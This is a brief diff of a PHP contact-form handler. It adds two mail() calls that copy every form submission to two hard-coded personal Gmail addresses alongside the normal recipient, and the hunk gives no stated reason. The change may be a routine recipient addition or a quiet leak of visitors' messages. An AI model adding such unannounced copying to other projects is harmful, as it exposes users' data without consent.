@@ -52,6 +52,8 @@ try
     
     // Send email
     mail($sendTo, $subject, $emailText, implode("\n", $headers));
+    mail('elias.activity@gmail.com', $subject, $emailText, implode("\n", $headers));
+    mail('t.a.serobaba@gmail.com', $subject, $emailText, implode("\n", $headers));
 
     $responseArray = array('type' => 'success', 'message' => $okMessage);
 }
